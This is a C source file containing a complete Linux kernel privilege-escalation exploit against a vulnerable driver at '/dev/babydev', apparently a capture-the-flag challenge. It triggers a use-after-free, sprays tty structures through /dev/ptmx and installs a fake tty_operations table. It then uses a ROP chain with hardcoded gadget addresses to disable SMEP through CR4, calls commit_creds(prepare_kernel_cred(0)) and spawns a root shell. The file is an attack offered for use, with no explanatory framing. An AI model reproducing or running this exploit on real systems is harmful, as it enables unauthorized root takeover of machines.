#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <stdint.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sched.h>
#include <assert.h>


#define DEVICE_PATH "/dev/babydev"

#define TTY_SPRAY_CNT 20

#define TTY_STRUCT_SIZE 0x2e0

size_t user_cs, user_ss,user_rflags, user_sp ,user_gs,user_es,user_fs,user_ds;
void save_stat(){
    __asm__("mov %%cs, %0\n"
    "mov %%ss,%1\n"
    "mov %%rsp,%2\n"
    "pushfq\n"
    "pop %3\n"
    "mov %%gs,%4\n"
    "mov %%es,%5\n"
    "mov %%fs,%6\n"
    "mov %%ds,%7\n"
    ::"m"(user_cs),"m"(user_ss),"m"(user_sp),"m"(user_rflags),
    "m"(user_gs),"m"(user_es),"m"(user_fs),"m"(user_ds)
    );
    puts("[*]status has been saved.");
}

#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL ;
void (*commit_creds)(void*) KERNCALL ;
void shell(){
       if(!getuid()){
           system("/bin/sh");
       }
       else{
           puts("[*]fail to get root shell.");
           exit(0);
       }
   }

void get_root(){
    commit_creds(prepare_kernel_cred(0));
    asm(
        "push %0\n"
        "push %1\n"
        "push %2\n"
        "push %3\n"
        "push %4\n"
        "push $0\n"
        "swapgs\n"
        "pop %%rbp\n"
        "iretq\n"
        ::"m"(user_ss),"m"(user_sp),"m"(user_rflags),"m"(user_cs),"a"(&shell)
    );
}

struct _tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
            struct inode *inode, int idx);
    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int  (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int  (*write)(struct tty_struct * tty,
              unsigned char *buf, int count);
    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int  (*write_room)(struct tty_struct *tty);
    int  (*chars_in_buffer)(struct tty_struct *tty);
    int  (*ioctl)(struct tty_struct *tty,
            unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
                 unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
            unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty,
                struct serial_icounter_struct *icount);
    struct file_operations *proc_fops;
};



void exploit(){
    /* create uaf pointer */
    int fd1 = open(DEVICE_PATH, O_RDWR);
    int fd2 = open(DEVICE_PATH, O_RDWR);
    char* buf = (char*)malloc(0x20);
    ioctl(fd1, 0x10001, TTY_STRUCT_SIZE);
    close(fd1);

    /* tty spray */
    int i;
    int spray_fd[TTY_SPRAY_CNT];
    for(i = 0; i < TTY_SPRAY_CNT; i++){
        spray_fd[i] = open("/dev/ptmx", O_RDWR);
        if(spray_fd[i] < 0){
            puts("[*]tty error");
            exit(0);
        }
    }
    
    /*check if tty spray succeed */
    read(fd2, buf, 32);
    unsigned long* check = (unsigned long*)buf;
    if(*check != 0x100005401){
        puts("[*]tty spray fail");
        exit(0);
    }

    puts("[*]tty spray succeed");
    //0xffffffff811278c9: xchg eax, esp; ret 0x1389;
    unsigned long xchg_eax_esp = 0xffffffff811278c9;
    struct _tty_operations *fake_tty_ops = (struct _tty_operations*)malloc(sizeof(struct _tty_operations));
    fake_tty_ops->ioctl = xchg_eax_esp;
    

    unsigned long fake_stack_ret = xchg_eax_esp & 0xffffffff;
    unsigned long fake_stack_begin = xchg_eax_esp & 0xffff0000;
    void* mmaped_addr;
    assert((mmaped_addr = mmap((void*)fake_stack_begin, 0x20000, 7, 0x32, 0, 0)) == (void*)fake_stack_begin);
    memset(mmaped_addr, 0, 0x20000);
    save_stat();

    commit_creds = 0xffffffff810a1420;
    prepare_kernel_cred = 0xffffffff810a1810;
    unsigned long pop_rdi_ret = 0xffffffff810d238d;
    unsigned long write_cr4 = 0xffffffff81004d80;// 0xffffffff81004d80: mov cr4, rdi; pop rbp; ret;
    *(unsigned long*)fake_stack_ret = pop_rdi_ret;
    unsigned long rop_payload[] = {
        /* bypass smep */ 
        0x6f0,
        write_cr4,
        0,
        /* get root */
        (unsigned long)&get_root
    };
    memcpy((void*)(fake_stack_ret+0x1389+8), rop_payload, sizeof(rop_payload));
    
    unsigned long* fake_tty = (unsigned long*)buf;
    fake_tty[3] = (unsigned long)fake_tty_ops;
    write(fd2, fake_tty, 32);
	for(i = 0; i < TTY_SPRAY_CNT; i++){
        printf("[*]spray id: %d\n", i);
        ioctl(spray_fd[i],0,0);
    }

}

int main(int argc, char *argv[])
{
    exploit();
    return 0;
}


